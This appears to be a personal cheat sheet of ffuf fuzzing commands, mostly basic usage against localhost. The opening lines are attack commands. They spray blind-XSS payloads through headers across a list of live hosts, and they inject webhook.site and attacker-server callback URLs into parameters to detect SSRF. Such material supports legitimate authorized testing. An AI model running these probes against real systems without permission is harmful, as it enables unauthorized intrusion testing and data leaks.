

ffuf -c -u FUZZ1 -H "FUZZ2: FUZZ3" -w alive_uber.txt:FUZZ1 -w headers.txt:FUZZ2 -w blind_xss.txt:FUZZ3 -x http://192.168.196.1:8082 -mode clusterbomb -v 


ffuf -c -u HOST/?PROT=https://webhook.site/f4494fd5-bd02-4fd2-893d-22368ac954b8/HOST/PROT -w alive_uber.txt:HOST -w ssrf_params:PROT -x http://192.168.196.1:8082 -mode clusterbomb -r -v 


ffuf -c -u HOST/?url=http://{my-server-ip}/DOMAIN/url&file=http://{my-server-ip}/DOMAIN/file -w hosts.txt:HOST -w domains.txt:DOMAIN -mode pitchfork -v 

####################################
####################################

# Basic Usage
ffuf -w wordlist.txt -u http://127.0.0.1:8000/api/FUZZ/6 -o output.txt -replay-proxy http://127.0.0.1:8080

# Basic Usage With a Cookie
ffuf -w wordlist.txt -u http://127.0.0.1:8000/api/FUZZ/6 -o output.txt -replay-proxy http://127.0.0.1:8080 -b "laravel_session=eyJpdiI6Ii8wQU11dTVlUkg2alRHUXBIVzlGSnc9PSIsInZhbHVlIjoiOWs3YllJWTdqNC9xa1pMeFRvMFh0OE1vRFpaWm9GSzFkRktVZS9yUHBDM0lIazZ4K0NsbndxWVIxQ05VZWhqZUZaR0RGQWlFdmdDc24yWllYRklGSXI5STd2b05Pam4yRXIwV1BUWkZhUnFLNUFzOWsycmRHcnlxS0FqRWNsSnEiLCJtYWMiOiI3ZTliMmM2YzIxOTExNDE0NmVjYTYyMGI4Nzg4YzJiYjNmNjVkNDI1YzEyODYwMzY5YzczNzY3NTUwZDk0OGYzIn0%3D;"

# Adding a delay
ffuf -w wordlist.txt -u http://127.0.0.1:8000/api/FUZZ/6 -o output.txt -replay-proxy http://127.0.0.1:8080 –p 1 –t 3

# Adding a delay (new method)
ffuf -w wordlist.txt -u http://127.0.0.1:8000/api/FUZZ/6 -o output.txt -replay-proxy http://127.0.0.1:8080 –rate 100

# Fuzzing 2 values
ffuf -w wordlist.txt:FUZZ -w actions-lowercase.txt:ME -u http://127.0.0.1:8000/api/FUZZ/ME -o output.txt -replay-proxy http://127.0.0.1:8080 

# Simple Filter
ffuf -w wordlist.txt:FUZZ -w actions-lowercase.txt:ME -u http://127.0.0.1:8000/api/FUZZ/ME -o output.txt -replay-proxy http://127.0.0.1:8080 -fw 1

# Simple Matcher
ffuf -w wordlist.txt:FUZZ -w actions-lowercase.txt:ME -u http://127.0.0.1:8000/api/FUZZ/ME -o output.txt -replay-proxy http://127.0.0.1:8080 -mc 302

# Custom Filters
ffuf -w wordlist.txt:FUZZ -w numbers.txt:ME -u http://127.0.0.1:8000/api/FUZZ/ME -o output.txt -replay-proxy http://127.0.0.1:8080 -fr "not found"

# Fuzzing Post Data
ffuf -w wordlist.txt -X POST -d "email=df%40fd.com&issue=dsafd&information=FUZZ" -u http://127.0.0.1:8000/vulnerability -replay-proxy http://127.0.0.1:8080

# Fuzzing Parameters (POST)
ffuf -w wordlist.txt -X POST -d "email=df%40fd.com&issue=dsafd&FUZZ=test" -u http://127.0.0.1:8000/vulnerability -replay-proxy http://127.0.0.1:8080

# Fuzzing Parameters (GET)
ffuf -w wordlist.txt -u http://127.0.0.1:8000/contact/submit?FUZZ=d%40d.com&issue=df -o output.txt -replay-proxy http://127.0.0.1:8080 

# Fuzzing JSON Post Data
ffuf -w wordlist.txt -X "PUT" -u http://127.0.0.1:8000/api/users/6 -H "Content-Type: application/json" -d "{'FUZZ':'test'}" -o output.txt -replay-proxy http://127.0.0.1:8080
